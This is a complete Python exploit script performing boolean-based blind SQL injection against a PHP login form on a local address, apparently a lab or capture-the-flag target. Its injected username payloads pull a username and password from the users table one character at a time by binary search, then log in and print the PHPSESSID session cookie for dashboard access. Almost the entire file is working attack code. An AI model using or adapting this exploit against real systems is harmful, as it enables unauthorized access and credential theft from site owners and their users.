import requests
import sys
import time

# Configuration
BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

# Session for requests
session = requests.Session()

# Headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

def test_injection(payload):
    """Test SQL injection payload and return True if condition is TRUE (username exists)"""
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        response_text = response.text
        
        # TRUE condition: response contains "password" (username exists but wrong password)
        # FALSE condition: response contains "username" (username doesn't exist)
        if "password" in response_text:
            return True
        elif "username" in response_text:
            return False
        else:
            print(f"[!] Unexpected response: {response_text[:200]}")
            return False
    except Exception as e:
        print(f"[!] Request error: {e}")
        return False

def extract_string(query, max_length=50):
    """Extract string using binary search on ASCII values"""
    result = ""
    print(f"[+] Extracting data with query: {query}")
    
    for position in range(1, max_length + 1):
        # Binary search for character
        low = 32  # Space
        high = 126  # ~
        char_code = 0
        
        while low <= high:
            mid = (low + high) // 2
            # Test if ASCII value is greater than mid
            test_payload = f"admin' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- "
            
            if test_injection(test_payload):
                low = mid + 1
            else:
                high = mid - 1
        
        # After binary search, the character is at position 'low'
        char_code = low
        
        # Verify this is the correct character
        verify_payload = f"admin' AND ASCII(SUBSTRING(({query}),{position},1))={char_code}-- "
        
        if test_injection(verify_payload):
            if char_code == 0:  # NULL - end of string
                print(f"[+] End of string reached at position {position-1}")
                break
            
            char = chr(char_code)
            result += char
            print(f"[+] Position {position}: '{char}' (ASCII: {char_code})")
        else:
            # Character not in standard range, try extended ASCII
            if char_code > 126:
                char = chr(char_code)
                result += char
                print(f"[+] Position {position}: '{char}' (Extended ASCII: {char_code})")
            else:
                print(f"[!] Could not determine character at position {position}")
                break
    
    return result.strip()

def extract_length(query, max_len=100):
    """Extract length of string using binary search"""
    print(f"[+] Extracting length of data from query: {query}")
    
    low = 0
    high = max_len
    
    while low <= high:
        mid = (low + high) // 2
        test_payload = f"admin' AND LENGTH(({query}))>{mid}-- "
        
        if test_injection(test_payload):
            low = mid + 1
        else:
            high = mid - 1
    
    length = low
    print(f"[+] Extracted length: {length}")
    return length

def extract_username():
    """Extract admin username"""
    print("\n" + "="*60)
    print("EXTRACTING ADMIN USERNAME")
    print("="*60)
    
    # Query to get first username from users table
    query = "SELECT username FROM users LIMIT 1"
    
    # First get length
    length = extract_length(query, max_len=50)
    
    # Then extract string
    username = extract_string(query, max_length=length)
    print(f"\n[+] Extracted username: '{username}'")
    return username

def extract_password(username):
    """Extract password hash for given username"""
    print("\n" + "="*60)
    print(f"EXTRACTING PASSWORD FOR USER: {username}")
    print("="*60)
    
    # Query to get password for the username
    query = f"SELECT password FROM users WHERE username='{username}' LIMIT 1"
    
    # First get length
    length = extract_length(query, max_len=100)
    
    # Then extract string
    password_hash = extract_string(query, max_length=length)
    print(f"\n[+] Extracted password: '{password_hash}'")
    return password_hash

def authenticate(username, password):
    """Authenticate with extracted credentials and return session cookie"""
    print("\n" + "="*60)
    print("AUTHENTICATING WITH EXTRACTED CREDENTIALS")
    print("="*60)
    
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        response_text = response.text
        
        print(f"[+] Response: {response_text}")
        
        # Check if authentication was successful
        if "Success" in response_text:
            print("[+] Authentication successful!")
            
            # Get PHPSESSID cookie
            cookies = session.cookies.get_dict()
            if "PHPSESSID" in cookies:
                phpsessid = cookies["PHPSESSID"]
                print(f"[+] PHPSESSID: {phpsessid}")
                return phpsessid
            else:
                print("[!] PHPSESSID not found in cookies")
                print(f"[+] Available cookies: {cookies}")
                return None
        else:
            print(f"[!] Authentication failed. Response: {response_text[:200]}")
            return None
    except Exception as e:
        print(f"[!] Authentication error: {e}")
        return None

def test_specific_username(test_name):
    """Test if a specific username exists"""
    print(f"\n[+] Testing if username '{test_name}' exists...")
    payload = f"{test_name}' AND 1=1-- "
    if test_injection(payload):
        print(f"[+] Username '{test_name}' exists!")
        return True
    else:
        print(f"[!] Username '{test_name}' does not exist")
        return False

def main():
    print("="*60)
    print("BOOLEAN-BASED BLIND SQL INJECTION EXPLOIT")
    print(f"Target: {BASE_URL}")
    print("="*60)
    
    # Test the injection works
    print("\n[+] Testing injection point...")
    
    # TRUE condition test - basic
    test_true = "admin' AND 1=1-- "
    if test_injection(test_true):
        print("[+] TRUE condition test (1=1) passed")
    else:
        print("[!] TRUE condition test failed")
        return
    
    # FALSE condition test - basic
    test_false = "admin' AND 1=2-- "
    if not test_injection(test_false):
        print("[+] FALSE condition test (1=2) passed")
    else:
        print("[!] FALSE condition test failed")
        return
    
    print("[+] Injection confirmed working!")
    
    # First, try to guess common admin usernames
    common_usernames = ["admin", "administrator", "root", "user", "test"]
    found_username = None
    
    for username in common_usernames:
        if test_specific_username(username):
            found_username = username
            break
    
    # If we found a username, extract its password
    if found_username:
        print(f"\n[+] Found username: {found_username}")
        password = extract_password(found_username)
        
        if password:
            print(f"\n[+] CREDENTIALS EXTRACTED:")
            print(f"    Username: {found_username}")
            print(f"    Password: {password}")
            
            # Try to authenticate
            phpsessid = authenticate(found_username, password)
            
            if phpsessid:
                print("\n" + "="*60)
                print("EXPLOIT SUCCESSFUL!")
                print("="*60)
                print(f"Username: {found_username}")
                print(f"Password: {password}")
                print(f"PHPSESSID: {phpsessid}")
                print("\nYou can now access /dashboard.php with this session cookie")
                return
    
    # If common usernames didn't work, try to extract using SQL query
    print("\n[+] Common usernames not found, extracting via SQL...")
    username = extract_username()
    
    if username:
        password_hash = extract_password(username)
        
        if password_hash:
            print(f"\n[+] CREDENTIALS EXTRACTED:")
            print(f"    Username: {username}")
            print(f"    Password: {password_hash}")
            
            # Try to authenticate
            phpsessid = authenticate(username, password_hash)
            
            if phpsessid:
                print("\n" + "="*60)
                print("EXPLOIT SUCCESSFUL!")
                print("="*60)
                print(f"Username: {username}")
                print(f"Password: {password_hash}")
                print(f"PHPSESSID: {phpsessid}")
                print("\nYou can now access /dashboard.php with this session cookie")
            else:
                print("\n[!] Exploit completed but authentication failed")
        else:
            print("\n[!] Failed to extract password hash")
    else:
        print("\n[!] Failed to extract username")

if __name__ == "__main__":
    main()
